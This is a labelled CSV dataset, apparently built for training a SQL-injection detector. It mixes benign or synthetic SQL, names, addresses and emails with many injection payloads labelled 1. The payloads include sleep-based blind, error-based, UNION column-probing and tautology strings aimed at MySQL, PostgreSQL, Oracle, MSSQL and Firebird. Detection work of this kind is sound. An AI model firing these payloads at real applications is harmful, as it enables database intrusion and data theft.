Query,Label
SELECT * FROM nothing WHERE milk BETWEEN '1996-07-01' AND '1996-07-31',0
update,1
SELECT * FROM put ORDER BY cowboy DESC,0
a7p9i9bl2,0
SELECT COUNT ( eightID ) FROM sick,0
"1""   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  ""suxh""  =  ""suxh",1
"1  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",1
"-4745"" or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""nifq"" like ""nifq",1
SELECT AVG ( gradually ) FROM load SELECT SUM ( average ) ,0
narita@deportechino.an,0
"1%'   )    )     )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  '%'  =  '",1
virge,0
1'   )    )    as yyud where 4934  =  4934,1
SELECT chest ( s )  FROM line UNION,0
pillars4,0
"  SELECT porch AS avoid, let AS [hill]  FROM automobile",0
"1'+  (  select immd where 7499  =  7499 union all select null,null,null,null,null,null,null,null#",1
sant llus,0
f36hu1a,0
plza. taboada chivite 32 5?b,0
"1'   )    )    as mdtm where 1393  =  1393 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
SELECT AVG ( pile ) FROM official SELECT SUM ( eager ) ,0
26%,1
15994230f,0
SELECT yellow ( s )  FROM knowledge SELECT ocean FROM audience,0
SELECT * FROM headed WHERE too = 'active' LIMIT 3,0
SELECT AVG ( chapter ) FROM all SELECT SUM ( parallel ) ,0
"1%"" or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and ""%""  =  """,1
"1'   )    )     )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'vtno'  =  'vtno",1
"codigo correspondencia oficial correos-telegrafos 86,",0
SELECT * FROM  ( SELECT past FROM material ) ,0
SELECT * FROM brief WHERE lesson NOT BETWEEN 'chose' AND 'sent',0
"1%' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and '%'  =  '",1
SELECT AVG ( writing ) FROM tales SELECT SUM ( shake ) ,0
252,0
hamlett,0
"de santiago carrillo solares 67, 8-f",0
1'   )    )     )   rlike sleep  (  5  )   and    (    (     (  'zwyx'  =  'zwyx,1
"-1254"" or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  ",1
8629,0
SELECT AVG ( during )  FROM buy  SELECT SUM ( brown ) ,0
SELECT * FROM entire WHERE    NOT sat = 'air',0
ribadesella,0
oruna,0
"1' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and 'ebuo'  =  'ebuo",1
"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null#",1
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  'hube'  =  'hube",1
lanfranchi@getgold.tl,0
-4684  )   as uqjn where 4550  =  4550 or 1689  =  5825,1
SELECT * FROM listen WHERE without BETWEEN '1996-07-01' AND '1996-07-31',0
"1   )    )    as npdl where 5796  =  5796 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
"carrer asturies, 49",0
"-5062""   )    )     )   union all select 4125,4125--",1
SELECT * FROM studied WHERE discuss = 'free' FETCH FIRST 3 ROWS ONLY,0
"1' in boolean mode  )   and make_set  (  7804  =  3315,3315  )  #",1
carilyn,0
SELECT * FROM neighborhood WHERE teeth IN  ( SELECT island FROM warm ) ,0
"1""   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
SELECT DISTINCT hunter FROM bus,0
1' in boolean mode  )   union all select null#,1
"1""   )    )     )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  ""fpwu"" like ""fpwu",1
limburg@estoespresto.cd,0
-7874   )    )     )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  2817  =  2817,1
85624451m,0
lores bigas,0
2561,0
8466,0
"  UPDATE sold SET merely =  'apple', City =  'sky' WHERE finest =  quietly",0
"c/ venecia, s/n,",0
SELECT * FROM substance FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT copy ( s )  FROM fastened LEFT JOIN,0
"  SELECT * FROM lay WHERE breathe IN  ( 'period', 'modern', 'similar' )  ",0
1'||  (  select 'ocmk' from dual where 3961  =  3961 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )     )  ||',1
SELECT came ( s )  FROM seed SELECT tobacco FROM sick,0
1  )   and 2457  =  8146,1
"1""   )    )    as nejd where 2885  =  2885",1
ji-chuu,0
SELECT * FROM form WHERE easier = 'mysterious' LIMIT 3,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 11507 )  ORDER BY meta_id ASC",0
niwinska@estudiodeyoga.td,0
"-7138"" union all select 2341,2341,2341,2341--",1
fontihoyuelo,0
"1%"" and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and 'fbnx'  =  'fbnx",1
" select * from users where id  =  1 +$+ union select null,@@VERSION -- 1",1
belalczar,0
"-4707' union all select 4414,4414,4414,4414,4414,4414#",1
45183,0
"1'   )    )    as wkys where 2478  =  2478 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
gibert mallorqun,0
casper,0
1'||  (  select 'ghby' from dual where 4854  =  4854,1
SELECT * FROM birds,0
SELECT * FROM blind WHERE together = 'fresh',0
SELECT said FROM cloud UNION ALL SELECT rocket FROM satisfied ORDER BY new,0
"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  ""cadh"" like ""cadh",1
SELECT * FROM vowel WHERE engine LIKE '%powerful%',0
"  SELECT * FROM building WHERE remain NOT IN  ( 'blanket', 'printed', 'eager' )  ",0
"1' in boolean mode  )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
amelia,0
kapp,0
solana de los barros,0
"aaiun, 122 12?f",0
SELECT Count ( * )  AS language,0
SELECT certainly ( s )  FROM compare FULL OUTER JOIN,0
SELECT DISTINCT missing FROM son,0
"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  'cewn'  =  'cewn",1
SELECT COUNT ( red )  FROM at,0
"-3933%""   )    )    or elt  (  8142  =  2978,2978  )   and    (    (   ""%""  =  """,1
"palomares, 2 11b",0
1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ,1
SELECT * FROM natural WHERE piece NOT LIKE 'roar%',0
SELECT COUNT ( rope ) FROM total,0
1   )    )     )   or sleep  (  5  )  #,1
SELECT AVG ( successful ) FROM ride,0
castell-platja d'aro,0
" select * from users where id  =  '1' union select ||/1,version  (    )   -- 1'",1
SELECT * FROM angry FETCH FIRST 3 ROWS ONLY,0
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  '%'  =  '",1
SELECT AVG ( car )  FROM tea  SELECT SUM ( this ) ,0
SELECT * FROM sound WHERE after NOT LIKE 'alive%',0
"1'   )    )    or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
s353icia41838e,0
elian,0
"-6389"" union all select 2355,2355,2355,2355,2355--",1
SELECT * FROM writer WHERE lying  BETWEEN 10 AND 20,0
"  UPDATE piece SET gently =  'success', City =  'duck' WHERE personal =  vegetable",0
2.82E+15,0
"1'+  (  select ttae where 4601  =  4601 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",1
"1"" where 7344  =  7344 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --",1
"SELECT * FROM laid WHERE none BETWEEN ""cat"" AND    ""ship""",0
-8015  )   where 9808  =  9808 or 9323  =  9323#,1
"   SELECT duck, nearby+ ', ' + quiet+ ' ' + wing+ ', ' + vessels AS engineer  FROM wherever",0
" select * from users where id  =  1 union select 1 $,version  (    )   -- 1",1
"-9947""   )    )     )   union all select 8765,8765,8765,8765,8765#",1
SELECT * FROM dangerous WHERE tears = 'sure' FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM honor WHERE moment = 'wave' FETCH FIRST 3 ROWS ONLY,0
SELECT option_value FROM wp_options WHERE option_name  =  '_options_footer_button_4_text' LIMIT 1,0
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'inec'  =  'inec",1
carol,0
1   )    )     )   and 9198  =  9198--,1
"1'   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   'cwjd'  =  'cwjd",1
SELECT * FROM spin WHERE NOT system = 'allow'  AND NOT law = 'current',0
frankos,0
atontamiento,0
SELECT * FROM  ( SELECT of FROM high ) ,0
SELECT * FROM settlers WHERE cloud BETWEEN '1996-07-01' AND '1996-07-31',0
"SELECT DAYOFMONTH ( ""2017-06-15 09:34:21"" ) ;",0
SELECT TOP 3 * FROM attack WHERE doctor = 'coat' SELECT * FROM smaller,0
5192,0
"iif  (  1217  =  8831,1,1/0  )  ",1
os,1
-7758%'   )    )     )   or 3038  =  3038,1
"-6125'||  (  select 'hwnm' where 1428  =  1428 union all select 1428,1428,1428,1428,1428,1428#",1
-9054   )    )     )   or 9323  =  9323#,1
congregation@saludyfitness.pm,0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  ""%""  =  """,1
chinaphan@viajesdacapalla.eh,0
SELECT COUNT ( DISTINCT seeing )  FROM swimming,0
"1%""  )   union all select null,null,null--",1
"-5516'+  (  select 'bmlv' where 7188  =  7188 union all select 7188,7188,7188,7188,7188,7188,7188,7188#",1
sabety,0
1 and 9412  =  6877#,1
SELECT * FROM Orders;,0
SELECT * FROM call FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT * FROM page WHERE rising = 'taken'  AND  ( thank = 'beside' OR bare = 'increase' ) ,0
"1""  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",1
SELECT * FROM prepare WHERE two = 'paper' FETCH FIRST 3 ROWS ONLY,0
"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )   ",1
"plaza aparejador federico bermudez 139,",0
"1""   )    )    as zemm where 3324  =  3324 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"  SELECT solveID AS ID, herself AS near FROM owner",0
6.44636E+15,0
SELECT option_value FROM wp_options WHERE option_name  =  '_options_linkedin_url' LIMIT 1,0
at89a7218,0
"-2920""   )    )    as zdgv where 9702  =  9702 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
"-5832""  )   or 1650  =  9011--",1
SELECT * FROM greatest WHERE tank = 'grow'  AND City = 'upper',0
SELECT AVG ( while ) FROM early,0
SELECT cut ( s )  FROM copper SELECT distant FROM cost,0
3226,0
deltell riberas,0
SELECT * FROM port WHERE yourself = 'season' LIMIT 3,0
"1   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  8018  =  8018",1
SELECT * FROM cabin WHERE minerals BETWEEN account09/01/1996beginning AND exist15/31/1996beside,0
SELECT * FROM anyway WHERE master = 'title',0
"1"" where 4672  =  4672",1
"-4964""   )    )    union all select 4750,4750,4750,4750,4750--",1
"-6096'  )   where 1316  =  1316 union all select 1316,1316,1316,1316,1316,1316,1316,1316#",1
SELECT Count ( * )  AS what,0
"1  )   as vzyk where 5103  =  5103 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
SELECT 18 % 4;,0
SELECT shall FROM better,0
6u33a,0
"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",1
"1'+  (  select vohg where 6383  =  6383 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +'",1
"1,  (  select   (  case when   (  1609  =  1609  )   then waitfor delay '0:0:5' else 1609*  (  select 1609 from master..sysdatabases  )   end   )    )   ",1
"1""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""rwlq""  =  ""rwlq",1
SELECT * FROM actually WHERE    NOT history = 'thus',0
villarejo del valle,0
SELECT * FROM increase WHERE discovery LIKE '%make%',0
1'  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) ,1
"  SELECT leaf,did FROM leave WHERE creature = 'whole' UNION SELECT nor, before FROM written",0
41217479f,0
SELECT * FROM wide FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT come FROM frighten,0
SELECT AVG ( greater ) FROM weight SELECT SUM ( atom ) ,0
SELECT bent ( s )  FROM individual UNION ALL,0
SELECT AVG ( mental ) FROM thick,0
ezio,0
SELECT * FROM typical,0
clooney,0
patterso,0
"cami terminal s/n,",0
cholgua,0
"  SELECT occasionally,younger FROM mass WHERE thou = 'trip' UNION SELECT stretch, engineer FROM certain",0
SELECT MIN ( deal )  AS has FROM instrument,0
"-9122  )   as sdlg where 1546  =  1546 union all select 1546,1546,1546,1546,1546,1546,1546--",1
31790,0
-3431%'  )   or 9323  =  9323#,1
e0u08os1,0
"1""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""tzog"" like ""tzog",1
1' where 8864  =  8864,1
brgmann saura,0
50629,0
"  SELECT soundID AS ID, situation AS common FROM watch",0
SELECT * FROM deep WHERE NOT sky = 'tent'  AND NOT who = 'crew',0
stetson,0
"1""  )   where 7452  =  7452",1
"-6680%""   )    )    union all select 3719,3719,3719,3719,3719,3719,3719,3719,3719--",1
felipa,0
SELECT * FROM upper WHERE strip NOT LIKE 'steady%',0
"1""  )   where 7588  =  7588 waitfor delay '0:0:5'--",1
DELETE FROM attached WHERE friendly = 'level',0
"SELECT SUBDATE ( ""2017-06-15"", INTERVAL -2 MONTH ) ;",0
42855301e,0
SELECT AVG ( read ) FROM steam,0
"1   )    )    as vycb where 3524  =  3524 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
SELECT unhappy FROM baby UNION SELECT kill FROM cake ORDER BY arrow,0
SELECT AVG ( Price ) FROM compare,0
SELECT AVG ( Price ) FROM purpose,0
"  SELECT partly,field FROM slide WHERE why = 'country' UNION SELECT no, replace FROM youth",0
SELECT * FROM managed FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM between,0
SELECT * FROM can WHERE NOT brief = 'desk'  AND NOT method = 'its',0
"1%'   )    )     )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  '%'  =  '",1
2.11E+15,0
SELECT * FROM read WHERE slightly = 'remember' FETCH FIRST 3 ROWS ONLY,0
"1 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  ",1
villadoz,0
"   SELECT COUNT ( stand ) , type FROM curve BY around",0
"1""   )    )     )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
"1"" where 3740  =  3740 rlike sleep  (  5  )  #",1
"calle francisco de leiva, 131,",0
nrez muriscot,0
1  )   where 5774  =  5774,1
padiernos,0
20654328y,0
SELECT * FROM balloon  WHERE roll = supper,0
SELECT COUNT ( steady ) FROM recognize,0
48289,0
SELECT TOP 3 * FROM paper WHERE wrapped = 'mistake',0
9.45491E+14,0
"  SELECT IF ( 500<1000, 5, 10 ) ;",0
SELECT * FROM identity WHERE nature = 'bottom' FETCH FIRST 3 ROWS ONLY,0
"  SELECT DATE ( ""2017-06-15"" ) ;",0
SELECT * FROM off WHERE motion = 'no',0
SELECT * FROM swim FETCH FIRST 50 PERCENT ROWS ONLY,0
 UPDATE long SET list = 'choice'WHERE fierce = 'strong',0
"1'   )    )    as oocd where 2919  =  2919 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
SELECT * FROM carbon WHERE indicate = 'paragraph' FETCH FIRST 3 ROWS ONLY,0
"1""   )    )    as jebl where 3464  =  3464",1
1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'lqsa' like 'lqsa,1
"calle robert gerhard, s/n 6c",0
"1  )   as otsb where 8380  =  8380 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
guciz,0
SELECT * FROM frequently WHERE interior = 'include'  AND  ( question = 'luck' OR earn = 'quiet' ) ,0
schweiger_blanc@restaurantepicopico.rw,0
21444030a,0
"1%""  )   union all select null,null,null,null,null,null,null,null#",1
"1'||  (  select 'cjwx' from dual where 7637  =  7637 and elt  (  9548  =  3991,3991   )    )   ||'",1
"-4756%'   )    )    union all select 7824,7824,7824,7824,7824,7824,7824,7824#",1
34578974s,0
"-8410"" or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""xhzr""  =  ""xhzr",1
"-2013""   )    )    as kisy where 3802  =  3802 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --",1
SELECT COUNT ( nearly ) FROM range,0
 (  select   (  case when   (  4108  =  4108  )   then 1 else 4108*  (  select 4108 from information_schema.character_sets  )   end   )    ) ,1
1'   )    )    as yqek where 1957  =  1957,1
"1'+  (  select 'aliz' where 5050  =  5050 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    )   +'",1
morn de almazn,0
brias,0
boquieni,0
"1  )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
SELECT acres ( s ) FROM necessary INNER JOIN,0
"  SELECT trip,shore FROM answer WHERE gulf = 'more' UNION SELECT record, melted FROM tea",0
DELETE FROM function,0
SELECT * FROM sky WHERE ever = 'baseball'  OR worse = 'grow',0
7.90589E+15,0
SELECT loose ( s )  FROM golden LEFT JOIN,0
"1%"" union all select null,null,null--",1
irissou,0
97228883v,0
"   SELECT COUNT ( pick ) , rope FROM final BY mistake",0
" SELECT CustomerName, ContactName, Address FROM Customers WHERE Address  IS NOT NULL;",0
2742,0
SELECT * FROM colony  WHERE cook = everybody,0
SELECT * FROM within ORDER BY came DESC,0
" select * from users where id  =  1 <@$$ union select 1,version  (    )   -- 1",1
1'||  (  select 'hlxd' from dual where 2615  =  2615 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ||',1
65886361d,0
SELECT * FROM sense WHERE roll = 'western' FETCH FIRST 3 ROWS ONLY,0
8020,0
"SELECT SupplierName, ContactName, Address, City, PostalCode, Country FROM Suppliers; INSERT INTO Customers  ( CustomerName, City, Country )  ",0
"1""   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  ""zoag"" like ""zoag",1
oreste,0
cibeles,0
"c/ rua mayor, 31, 1?e",0
SELECT mice ( s FROM truth RIGHT JOIN,0
"-9166""  )   as hlre where 4768  =  4768 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --",1
SELECT * FROM material WHERE poem = 'married',0
zahnley,0
"1""  )   where 7957  =  7957 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
select pg_sleep  (  5  ) ,1
18611,0
48di48l92,0
"  UPDATE through SET count =  'piano', City =  'plane' WHERE chief =  simple",0
26241,0
"1%""   )    )     )   and elt  (  9524  =  1124,1124  )   and    (    (     (  ""%""  =  """,1
SELECT * FROM job WHERE wash = 'floating' FETCH FIRST 3 ROWS ONLY,0
-6298' or 4724  =  4876,1
-6200%'   )    )    or 8077  =  4661,1
leonila,0
-9841 where 4612  =  4612 union all select 4612--,1
"-8976%""   )    )     )   union all select 5146,5146,5146,5146,5146,5146,5146,5146--",1
gervasio,0
1'   )    )    as zffq where 9572  =  9572 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,1
micr6pil8,0
SELECT * FROM fall,0
1   )    )    as xmac where 7692  =  7692,1
"  SELECT * FROM cotton WHERE bar NOT IN  ( 'addition', 'off', 'page' )  ",0
end and    (    (   6874  =  6874,1
DELETE FROM roof WHERE part = 'lesson',0
1'  )   and 7290  =  8416 and   (  'ktlz' like 'ktlz,1
SELECT MIN ( report )  AS man FROM provide,0
SELECT * FROM mix WHERE    NOT die = 'ask',0
jasmann,0
50422961s,0
SELECT high ( s )  FROM snake UNION ALL,0
autonell,0
SELECT * FROM gravity,0
"1  )   as ekgx where 9923  =  9923 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
"1""  )   where 3727  =  3727 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
1'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1
"1'   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  'ibav'  =  'ibav",1
chilel,0
e298r4jina715,0
3.20326E+15,0
1'||  (  select 'etvo' from dual where 1557  =  1557,1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 239190 )  ORDER BY meta_id ASC",0
16630,0
"   SELECT question, barn, lieFROM current WHERE burst  IS NOT NULL",0
" select * from users where id  =  1 or ""??"" or 1  =  1 -- 1",1
lema cuartero,0
SELECT * FROM poem  WHERE brush NOT LIKE '[furniture]%',0
SELECT * FROM past  WHERE shoe NOT LIKE '[cost]%',0
8.74946E+15,0
dax-branson@indianabilljaen.kp,0
"-8409%'  )   or make_set  (  9354  =  9354,7185  )   and   (  '%'  =  '",1
SELECT * FROM border WHERE gift IN  ( SELECT giving FROM own ) ,0
1' where 9816  =  9816 and 7533  =  7533--,1
"1""  )   where 9648  =  9648 and elt  (  1210  =  1210,sleep  (  5   )    )   --",1
1'||  (  select 'noik' from dual where 9851  =  9851,1
melosa,0
SELECT * FROM compass,0
" SELECT column_name ( s )  FROM blanket,angle",0
mucientes,0
"  SELECT screenID AS ID, tiny AS swimming FROM become",0
"-5630""  )   or 3038  =  3038",1
SELECT themselves FROM riding UNION ALL SELECT might FROM rose ORDER BY dangerous,0
SELECT * FROM comfortable FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM chamber,0
"-7635"" union all select 1284,1284,1284,1284,1284,1284#",1
"  SELECT until,tube,blow FROM stopped LEFT JOIN Orders ON engine.silenceID =  everything.change ORDER BY metal.universe",0
51780892a,0
5986,0
8110,0
"1  )   where 1415  =  1415 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1
barby,0
